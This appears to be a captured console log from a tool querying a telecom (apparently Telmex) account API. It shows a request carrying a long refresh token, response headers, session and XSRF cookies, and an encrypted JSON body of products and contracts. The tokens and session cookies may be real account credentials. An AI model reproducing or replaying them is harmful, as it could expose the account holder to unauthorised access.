+{"phone":"H1Jr5WTUSqWPTaOvs24p86matcZzS/qG9yUF8A/wWupNEUHKCwQ=","refresh_token":"eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4R0NNIiwidHlwIjoiSldUIiwiY3R5IjoiSldUIiwiemlwIjoiREVGIiwia2lkIjoiMCJ9.bRWe4yKFlEaxfJhuHXmnUf1krt6dBCrq.KM7wujKoQD4YbXTv.DW0TQEP4vamxNYdWQ5nKcXBtFjM6YR8rt3eyeoQ7PBWw2woWV6joXRBaFe4ut3sgsewL4PLkFB0xP7yH8RqAXj5NDGH-kV7ioi9j8NVz3RUejW6dou0Z4nBqFPwQ10QNb_G45QuCcYknlol6ufxHwN9a_QGr_3A34LOpD1mGm2gUl831-T8c7QvdeKmy45UxDZhHp-dJOgXFFH1DTv-zTCUicUAANCLxFc2GiST-OAnoYj3brLk7QOU2UDeleYNfT7qYnlI7Uewu9x0e707_AnMB-f_eZRJeLgzQRbrd2_pPWlewke3ztIXzhC8Xw9l9xK_ZKaFo56aGRiqHR2K0HSHMMXbv5IN4GsIUnTLUuQldRG_-icHUTnz1xYL0bb4fmZx8cGhLwNIfrZ5v5rBztJDu4B7uFqx3hKXGL5eb8PPVYAyN2vfbpHpbFqzlTaUeL7pGDyZTlaJ2UKiscAR1GZngLfexdVx3uKCN-A72H48DIbL-VZmoaZk6rB775Ld2A_CcPiZaojw-Oq26JHClmTRBHsH7eiKKezmTG8GXqhno7HdsxcazjnvhcpM5GUlibtLvVdxZ2U6_Bp6qUvQZtzdxt0uDUkGxpbpoM6B7XmL4yfxozXosW5TDdhaqHm08fH7VGsK4FWyPZ-lZWeefDgD2OH3GzLYA87vKxAEWrBkbzuwANA4nk8AM3VDz_cBLRT3iexvI6Fe9ikt3YxyjOp5uLHppgO2mw4vwLnCXk051RR74fQNn251-jYvGRriq5cAF4oZA58f0LytQMi5371k3nZz13mdYLaOEOKdHrU_koa2JHKMHp_W3czSjUmuJlMGD2zxr-PeMUDU4winc_EXy98jiLBoZ2idQWbTAc95T8qODeFhuwkSefnUkzYDQaTNWf8MQjv_K_yGxgnWzU2ZsRSC72jPXqlqdKVBABlLNwjp2oQETQSJ1g5xD0TbeeSwI9v2j9qvadoWkCYu_UsHoSL9bOPoHDfvMJ7mq-W5VYGZytDNAErJdEcDmMj5DFIoyA8QujlYNwzLIFEGQUKRIaF8flY_UCiuB7LptjZMTAX-NK611wg0-11jT4uyxAuf4w1i1G14nlXIiabbJRNKzJMh_gVOuJe4_awlgX7B4Uj88X4QMsS04cr19T_9kjjNEcxcUak6TtJrVx50KDLFHq5UsaryTgrpacs2tW9twd6AahZi6vjFzOghhpOHMkb5pP-6q8RkGwCI-AKY-q14xvjlQ02a6HeuDKuN-3uLzTOZPyNqXiT9t4-HrDUlrM1wT8brJg6lJx3AvMRzDi4VhHyWcQy9zy3fuUAVeTs4sprMYQNGhFVLn_5uEURS0ZBe5GZLMBDoRzgJENdUEFORArIHXZ4ppc_BEW0zWgjVRUW03scqYs6JWteCNn88FA6zsATrXEW7XM20pAoMkiMb7gh6euZfNVugKK5k6-DRBXZa7aKQb7zjmEMyw_K8aVLG4oGGr_raUrjLSPvH9naaOB92fJozjse10wAh2vFmxZSdvZGoXOORASPceP7NKvEFhu5vZVN_S6y3yMCK03ky18OvmJQfFocGckaKK6WGT1w57mYiUXD1ZpKk30Q.Ar1exal42raI3ZDXgTCS_g"}
+
+[RESPONSE]
+[Headers Recivied]
+Cache-Control: no-cache, no-store
+Connection: keep-alive
+Content-Security-Policy: default-src 'self'; font-src *;img-src * data:; script-src *; style-src *;
+Content-Type: application/json
+Date: Fri, 30 Oct 2026 20:19:30 GMT
+Expires: Fri, 30 Oct 2026 20:19:30 GMT
+Feature-Policy: geolocation 'self'; vibrate 'none'
+Permissions-Policy: geolocation=(); midi=();notifications=();push=();sync-xhr=();accelerometer=(); gyroscope=(); magnetometer=(); payment=(); camera=(); microphone=();usb=(); xr=();speaker=(self);vibrate=();fullscreen=(self);
+Referrer-Policy: same-origin
+Server: ReplaceHeaderValue
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Trkevent: True
+Uzmcr: 80284
+Uzmcrn: 1987029
+Vary: Accept-Encoding,User-Agent
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+X-Xss-Protection: 1; mode=block
+
+[Cookies Recivied]
+__uzmc=918021645580; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:58 GMT; Max-Age=15724800; SameSite=Lax
+__uzmd=1793391538; Secure; HttpOnly; path=/; Expires=Fri, 30-Apr-27 20:18:58 GMT; Max-Age=15724800; SameSite=Lax
+XSRF-TOKEN=eyJpdiI6Im5ad0dTaSsraEVPcHJqV3FzT2toRlE9PSIsInZhbHVlIjoiM3ZsdG5ZNkFOVVpUMGpjK2RTS3V5TDIwVWJnME95eEZ6XC9hTlIxUHY0cVZlTlNrWkFWRjlDMTV6OEZZTzBrWXlYS0g5aVVyWWJYbmlkcE96clNUanBBPT0iLCJtYWMiOiI0MDhkOWIzNzc4NzJmNTU1MTk0OWRkOGVhNTk3MThlYzY1MmU5ZjVlNWJjMzhjMjMyMzczYTEwMGJiMzY1NGU5In0%3D; expires=Fri, 30-Oct-2026 22:19:35 GMT; Max-Age=7200; path=/; secure; HttpOnly
+telmex_middleware=eyJpdiI6IlRWUGJjaEFnXC83eTJ2NEhPTldNeVVnPT0iLCJ2YWx1ZSI6InNEZnE5dEtNMWQwWjBtUGR4S2FMd3h4bVwvYmVlcjhLVjFBSCtKQWNaQ3BFMThod1daYkE5UkJEUUJUYnJlOVVFY0ZWNnZPdDBRcWpPSTlvRGFTVTJiQT09IiwibWFjIjoiNDFmZmNlMTk4ZGZlNDNhNTQ2YjMxMmNlNDlhNzE1ODZlODgwYzE3MDM2ZDM3M2ZjZjc4ZWRiZWViMDY1YjhmNSJ9; path=/; secure; HttpOnly
+__xdst=7f7000f09e99f4-0ceb-43e8-b5bd-90358eafd81101179339153111313436-fd64193eb3ca8dc012; Expires=Fri, 30-Apr-27 20:19:04 GMT; Max-Age=15724800; HttpOnly; path=/;
+
+[Body]
+{"code":"00","description":"\u00c9xito","phone":"eQuHgkRDp7wvkWhsV+Q\/f4q2r2I4b+CM\/chbMgw30DOH5U95\/EE=","products":[{"product":"559dJRc5OM+ABWD27vUJcKQ67ZcaGr7emY9Mpy96OlVA","status":"RukXfdiz+c3wdPa+WzIQ9dAlT4HldzRE2QK5daw=","psi":"","sku":"","virtualNumber":"","contractFolio":"U7D82mqjzdyQF2LnTqVxBCjDycnANvEWGdAwxuZogWnjHC\/HMuI1Roa8\/g==","email":""},{"product":"o0qe\/O6XK+ktmPwNQ0d2UQPxcANmPGHI3ue3qOvL4P19","status":"optJYqEAPf1Z+gamHClSxr3w\/f\/aBMsBk0vr4B4=","psi":"","sku":"","virtualNumber":"gPe1r+5T5DR7809HkqyeUpA0IoBM+LKyNiPrHinAyuwhpTBiYDg=","contractFolio":"W2iFTM3YaMu1aCqSBAau8ls5JsN8YqjtIllwvob99GpMmqjyldixr8cvOQ==","email":"pyerUgabPu4wRmh3iqrucm1Fx2HCPo1FeiiKeG+QN3MSBf3rF5Kzmdjy2A2clH6TYHH4"}]}
+
+────────────────────────────────────────────────────────────────
+
+
+
+Presiona Enter para salir...
